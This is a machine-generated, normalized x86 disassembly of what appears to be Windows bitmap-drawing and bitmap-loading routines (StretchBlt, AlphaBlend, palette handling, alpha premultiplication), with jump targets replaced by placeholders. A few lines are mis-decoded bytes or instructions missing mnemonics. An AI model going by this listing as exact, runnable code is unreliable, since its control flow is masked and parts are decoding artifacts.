call sub_44df24
push eax
call SetStretchBltMode
mov eax ebx
call sub_451144
movzx edx [ r-xdata ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
mov eax ebx
call sub_4516fc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4c ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_450d2f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_44e2f0
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_451144
mov eax [ eax + 0x38 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
call sub_44e4a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_451144
mov eax [ eax + 0x38 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call StretchBlt
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1f ] 0x0
mov [ ebp - 0x1e ] 0xff
mov [ ebp - 0x1d ] 0x1
push [ ebp - 0x20 ]
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_451144
mov eax [ eax + 0x38 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44df24
push eax
call AlphaBlend
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call SelectPalette
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450dfa
cmp [ ebp - 0x9 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_450e05
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
movzx edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax ebx
call sub_45175c
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_451214
test al al
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_4510af
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_44df24
push eax
call SetStretchBltMode
mov eax ebx
call sub_451144
movzx edx [ r-xdata ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
mov eax ebx
call sub_4516fc
cmp [ esi + 0x3e ] 0x20
jne r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_450fdb
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_44e2f0
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_451144
mov eax [ eax + 0x38 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
call sub_44e4a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1f ] 0x0
movzx eax [ ebp + 0x8 ]
mov [ ebp - 0x1e ] al
mov [ ebp - 0x1d ] 0x0
push [ ebp - 0x20 ]
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_451144
mov eax [ eax + 0x38 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44df24
push eax
call AlphaBlend
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1f ] 0x0
movzx eax [ ebp + 0x8 ]
mov [ ebp - 0x1e ] al
mov [ ebp - 0x1d ] 0x1
push [ ebp - 0x20 ]
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_451144
mov eax [ eax + 0x38 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44df24
push eax
call AlphaBlend
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4510b6
sub_450fb8
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_4510c4
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_451578
cmp [ ebx + 0x70 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4509e8
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_44e248
sub_451144
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_451578
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44fb58
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0xc ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x8 ] eax
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_450aa8
sub_45118c
push ebx
mov ebx eax
mov eax ebx
call sub_451568
mov eax ebx
call sub_451578
mov edx ebx
mov eax ebx
call sub_450aa8
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_4511c4
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_451244
push ebx
push esi
mov esi eax
mov bl 0x8
mov eax esi
call sub_4511c4
cmp al 0x1
jne r-xdata
mov eax [ esi + 0x28 ]
lea edx [ eax + 0x18 ]
lea eax [ edx + 0x18 ]
movzx ecx [ eax + 0xe ]
cmp ecx 0x10
jg r-xdata
xor ebx ebx
jmp r-xdata
sub ecx 0x18
je r-xdata
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x6
jmp r-xdata
sub ecx 0x8
je r-xdata
mov eax [ eax + 0x10 ]
sub eax 0x1
jb r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov bl 0x4
jmp r-xdata
sub eax 0x2
je r-xdata
mov bl 0x1
jmp r-xdata
sub ecx 0x3
je r-xdata
mov bl 0x7
cmp [ edx + 0x44 ] 0x7e0
jne r-xdata
jmp r-xdata
mov bl 0x2
jmp r-xdata
sub ecx 0x4
je r-xdata
mov bl 0x5
jmp r-xdata
mov bl 0x3
jmp r-xdata
jmp r-xdata
sub_4512e4
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ esi + 0x28 ]
cmp [ eax + 0x3e ] 0x20
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax [ esi + 0x28 ]
mov eax [ eax + 0x2c ]
test eax eax
je r-xdata
mov ebx eax
mov eax esi
call sub_451578
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4509e8
mov ebx eax
jmp r-xdata
mov eax [ esi + 0x28 ]
mov eax [ eax + 0x2c ]
mov edx [ esi + 0x28 ]
add eax [ edx + 0x44 ]
cmp eax ebx
ja r-xdata
lea eax [ ebx + 0x3 ]
movzx edi [ eax ]
push 0xff
movzx ebp di
push ebp
movzx eax [ ebx ]
push eax
call MulDiv
mov [ ebx ] al
push 0xff
push ebp
lea eax [ ebx + 0x1 ]
movzx eax [ eax ]
push eax
call MulDiv
lea edx [ ebx + 0x1 ]
mov [ edx ] al
push 0xff
push ebp
lea eax [ ebx + 0x2 ]
movzx eax [ eax ]
push eax
call MulDiv
lea edx [ ebx + 0x2 ]
mov [ edx ] al
add ebx 0x4
sub_451388
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ esi + 0x28 ]
cmp [ eax + 0x3e ] 0x20
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax [ esi + 0x28 ]
mov eax [ eax + 0x2c ]
test eax eax
je r-xdata
mov ebx eax
mov eax esi
call sub_451578
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4509e8
mov ebx eax
jmp r-xdata
mov ebp [ esi + 0x28 ]
mov eax [ ebp + 0x2c ]
add eax [ ebp + 0x44 ]
cmp eax ebx
ja r-xdata
lea eax [ ebx + 0x3 ]
cmp [ eax ] 0x0
jne r-xdata
lea eax [ ebx + 0x3 ]
movzx edi [ eax ]
movzx eax di
push eax
push 0xff
movzx eax [ ebx ]
push eax
call MulDiv
mov [ ebx ] al
movzx eax di
push eax
push 0xff
lea eax [ ebx + 0x1 ]
movzx eax [ eax ]
push eax
call MulDiv
lea edx [ ebx + 0x1 ]
mov [ edx ] al
movzx eax di
push eax
push 0xff
lea eax [ ebx + 0x2 ]
movzx eax [ eax ]
push eax
call MulDiv
lea edx [ ebx + 0x2 ]
mov [ edx ] al
mov [ ebx ] 0x0
lea eax [ ebx + 0x1 ]
mov [ eax ] 0x0
lea eax [ ebx + 0x2 ]
mov [ eax ] 0x0
jmp r-xdata
add ebx 0x4
sub_451448
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x28 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov edi eax
mov eax esi
call sub_451578
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x8 ]
mov eax esi
call sub_4509e8
test bl bl
jne r-xdata
mov eax esi
call sub_4512e4
jmp r-xdata
mov [ esi + 0x39 ] bl
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
call sub_451388
sub_4514a4
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_44bb2c
mov eax ebx
call sub_451214
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
dec eax
push eax
mov eax ebx
call sub_451144
xor edx edx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_4514f4
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_45175c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_44ff50
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectW
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
movzx ecx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_451578
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_433c88
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_4515fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_451618
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_4516c3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax ebx
call sub_451568
mov eax ebx
call sub_451578
mov eax edi
call sub_44bb2c
mov ecx eax
mov esi [ ebx + 0x28 ]
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_450618
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
xor ecx ecx
mov edx 0x54
call sub_404c14
lea eax [ ebp - 0x5c ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectW
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
call sub_4505b4
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
movzx eax [ eax + 0x71 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_45199c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4516c8
mov eax [ ebp - 0x8 ]
call sub_44ab78
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_406120
call sub_406174
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_4516fc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_451568
mov eax ebx
call sub_451578
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_4514a4
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_450618
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_44facc
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_45175c
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
movzx ecx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_44e9e8
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_44facc
push 0x0
call GetDC
call sub_44e2f0
mov esi eax
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x70 ] bl
test bl bl
je r-xdata
sub_451814
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_44e1c4
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_4509e8
mov eax [ esi + 0x28 ]
mov [ eax + 0x71 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_451568
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_404c14
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectW
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_451898
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_451568
push edi
push 0x2
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_434af0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4518f9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_451ac4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451900
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
sub_451908
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_451568
push edi
push 0x2
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_434b48
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_451969
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_451ac4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451970
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
sub_451978
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_433c68
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_452054
pop esi
pop ebx
retn
sub_45199c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_451a24
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
movzx edx [ ebp + 0xc ]
mov [ eax + 0x71 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_405830
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_451a82
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_44fd78
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451a89
push rw-data
call LeaveCriticalSection
retn
sub_451a9c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_452054
pop edx
pop edi
pop esi
pop ebx
retn
sub_451ac4
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_404204
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_451fe7
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_451fba
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x20 ]
sub esi eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_404c14
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
movzx edx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
movzx edx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_44e1dc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
movzx eax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_433f2c
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
